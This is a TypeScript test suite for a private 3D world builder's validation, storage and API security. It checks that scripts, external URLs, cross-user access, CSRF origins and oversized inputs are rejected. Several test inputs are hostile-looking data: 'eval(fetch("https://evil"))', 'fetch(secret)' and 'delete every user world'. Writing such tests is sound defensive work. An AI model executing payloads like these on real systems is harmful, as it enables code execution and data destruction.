import { test } from 'node:test'
import assert from 'node:assert/strict'
import { blankWorld, validatePrivateWorld, newEntity, parseWorldCommand, applyWorldCommand, terrainHeight, riverCenter } from '../src/lib/privateWorld.ts'
import { privateWorldApi } from '../server/privateWorldApi.ts'
import { privateWorldStore } from '../server/privateWorldStore.ts'
import { AccountEntitlements, type EntitlementStorage } from '../server/entitlements.ts'
type WorldReply = { ok: boolean; code: number; revision: number; ids: string[]; document: ReturnType<typeof blankWorld>; worlds: { id: string }[] }
const readReply = (response: Response) => response.json() as Promise<WorldReply>
const alice = '11111111-1111-4111-8111-111111111111', bob = '22222222-2222-4222-8222-222222222222'
function store() {
  const map = new Map<string, unknown>()
  let queue = Promise.resolve()
  const storage: EntitlementStorage = {
    async get<T>(key: string) { return map.get(key) as T | undefined },
    async put(key, value) { map.set(key, structuredClone(value)) },
    transaction(fn) { const next = queue.then(() => fn(storage)); queue = next.then(() => {}, () => {}); return next },
  }
  return { map, storage }
}
const call = async (storage: EntitlementStorage, input: unknown) => (await privateWorldStore(new Request('https://internal/private-worlds', { method: 'POST', body: JSON.stringify(input) }), storage, 1790640000000)).json() as Promise<WorldReply>
test('a new world is empty meadow/river; strict validation rejects scripts, URLs and excess complexity', () => {
  const w = validatePrivateWorld(blankWorld())
  assert.equal(w.entities.length, 0); assert.equal(w.terrain.length, 0); assert.equal(w.night, false)
  assert.deepEqual(w.controls, ['jump'])
  for (const change of [{ owner: alice }, { script: 'fetch(secret)' }, { name: 'x'.repeat(81) }, { entities: [{ ...newEntity('tree', 0, 0), assetId: 'https://example.com/a.glb' }] }, { entities: [newEntity('tree', Infinity, 0)] }]) assert.throws(() => validatePrivateWorld({ ...w, ...change }))
})
test('terrain tools change actual heights while preserving the continuous river', () => {
  const edit = { id: crypto.randomUUID(), x: 12, z: 0, radius: 7, strength: 4 }
  assert.equal(terrainHeight(12, 0, []), 0); assert.equal(terrainHeight(12, 0, [edit]), 4)
  assert.equal(terrainHeight(12, 0, [{ ...edit, strength: -3 }]), -3)
  for (let z = -35; z < 36; z++) assert.equal(terrainHeight(riverCenter(z), z, [edit]), -.9)
})
test('local commands apply only bounded data edits; arbitrary code is never executable', () => {
  let w = blankWorld(); const point = { x: 10, z: 5 }
  for (const text of ['Dodaj przycisk skoku', 'Add sprint', 'Show stars', 'Wykop dolinę', 'Postaw górę', 'Dodaj drzewo']) {
    const command = parseWorldCommand(text); assert.ok(command, text); w = applyWorldCommand(w, command, point)
  }
  assert.ok(w.controls.includes('sprint')); assert.equal(w.night, true); assert.equal(w.entities.length, 1); assert.equal(w.terrain.length, 2)
  assert.equal(parseWorldCommand('eval(fetch("https://evil"))'), null); assert.equal(parseWorldCommand('delete every user world'), null)
})
test('concurrent saves are compare-and-swap; stale writers do not overwrite a newer world', async () => {
  const { storage } = store(), w = blankWorld('First')
  assert.equal((await call(storage, { action: 'save', id: w.id, document: w, expectedRevision: 0 })).revision, 1)
  const both = await Promise.all(['A', 'B'].map(name => call(storage, { action: 'save', id: w.id, document: { ...w, name }, expectedRevision: 1 })))
  assert.equal(both.filter(r => r.ok).length, 1); assert.equal(both.filter(r => r.code === 409).length, 1)
  assert.equal((await call(storage, { action: 'read', id: w.id })).revision, 2)
})
test('deletion tombstones prevent stale clients from resurrecting a removed world', async () => {
  const { storage } = store(), w = blankWorld()
  await call(storage, { action: 'save', id: w.id, document: w, expectedRevision: 0 })
  assert.equal((await call(storage, { action: 'remove', id: w.id, expectedRevision: 1 })).revision, 2)
  assert.equal((await call(storage, { action: 'save', id: w.id, document: w, expectedRevision: 0 })).code, 409)
  assert.equal((await call(storage, { action: 'read', id: w.id })).code, 404)
})
test('storage limits keep eight prior worlds intact; geometry limits reject oversized scenes', async () => {
  const { storage } = store()
  for (let i = 0; i < 8; i++) { const w = blankWorld(`World ${i}`); assert.equal((await call(storage, { action: 'save', id: w.id, document: w, expectedRevision: 0 })).ok, true) }
  const more = blankWorld()
  assert.equal((await call(storage, { action: 'save', id: more.id, document: more, expectedRevision: 0 })).code, 409)
  assert.equal((await call(storage, { action: 'list' })).worlds.length, 8)
  assert.throws(() => validatePrivateWorld({ ...more, entities: Array.from({ length: 49 }, () => newEntity('tree', 0, 0)) }))
  assert.throws(() => validatePrivateWorld({ ...more, entities: Array.from({ length: 5 }, () => newEntity('asset', 0, 0, crypto.randomUUID())) }))
})
function fixture() {
  const stores = new Map<string, ReturnType<typeof store>>()
  const env = {
    ENFORCE_ACCOUNT_ENTITLEMENTS: 'true',
    ACCOUNT_LIMITER: { async limit() { return { success: true } } },
    ACCOUNT_ENTITLEMENTS: {
      idFromName(name: string) { return name },
      get(id: unknown) {
        const name = String(id)
        if (!stores.has(name)) stores.set(name, store())
        return { fetch(request: Request) { return new AccountEntitlements({ storage: stores.get(name)!.storage }).fetch(request) } }
      },
    },
  }
  const fetcher = (async (url: unknown, init?: RequestInit) => {
    assert.match(String(url), /\/auth\/v1\/user$/)
    const token = new Headers(init?.headers).get('Authorization')
    const id = token === 'Bearer alice-token' ? alice : token === 'Bearer bob-token' ? bob : null
    return id ? Response.json({ id, email: 'fixture@example.test', user_metadata: { name: 'Fixture' } }) : Response.json({ error: 'unauthorized' }, { status: 401 })
  }) as typeof fetch
  const request = (path: string, method = 'GET', body?: unknown, who = 'alice', extra: Record<string, string> = {}) => privateWorldApi(new Request('https://worldifact.test' + path, {
    method,
    headers: { ...(who ? { Cookie: `__Host-worldifact-access=${who}-token` } : {}), ...(method !== 'GET' ? { Origin: 'https://worldifact.test', 'Content-Type': 'application/json' } : {}), ...extra },
    ...(body === undefined ? {} : { body: JSON.stringify(body) }),
  }), env, fetcher)
  return { request, stores }
}
test('Alice and Bob cannot read or overwrite each other’s worlds through copied identifiers', async () => {
  const f = fixture(), w = blankWorld('Alice private')
  assert.equal((await f.request('/api/worlds', 'POST', { document: w, expectedRevision: 0 }))!.status, 200)
  assert.equal((await f.request('/api/worlds/' + w.id, 'GET', undefined, 'bob'))!.status, 404)
  assert.equal((await f.request('/api/worlds/' + w.id, 'PUT', { document: { ...w, name: 'hacked' }, expectedRevision: 1 }, 'bob'))!.status, 409)
  assert.equal((await readReply((await f.request('/api/worlds/' + w.id))!)).document.name, 'Alice private')
  assert.equal((await readReply((await f.request('/api/worlds', 'GET', undefined, 'bob'))!)).worlds.length, 0)
  assert.equal(f.stores.size, 2)
})
test('owner overrides, CSRF, missing auth, oversize and arbitrary queries fail without writes', async () => {
  const f = fixture(), w = blankWorld()
  assert.equal((await f.request('/api/worlds', 'POST', { document: w, expectedRevision: 0, owner: bob }))!.status, 400)
  assert.equal((await f.request('/api/worlds', 'POST', { document: w, expectedRevision: 0 }, 'alice', { Origin: 'https://evil.test' }))!.status, 403)
  assert.equal((await f.request('/api/worlds', 'GET', undefined, ''))!.status, 401)
  assert.equal((await f.request('/api/worlds?owner=' + alice))!.status, 400)
  assert.equal((await f.request('/api/worlds', 'POST', { document: { ...w, name: 'x'.repeat(70000) }, expectedRevision: 0 }))!.status, 413)
  assert.equal(f.stores.size, 0)
})
test('generation gallery exposes only owned, complete and currently downloadable models', async () => {
  const { storage } = store(), id = crypto.randomUUID(), unknown = crypto.randomUUID()
  await storage.put('job:' + id, { state: 'completed', profile: 'fast' })
  assert.deepEqual((await call(storage, { action: 'library', ids: [id, unknown] })).ids, [id])
  await storage.put('billingHold', true)
  assert.deepEqual((await call(storage, { action: 'library', ids: [id] })).ids, [])
})
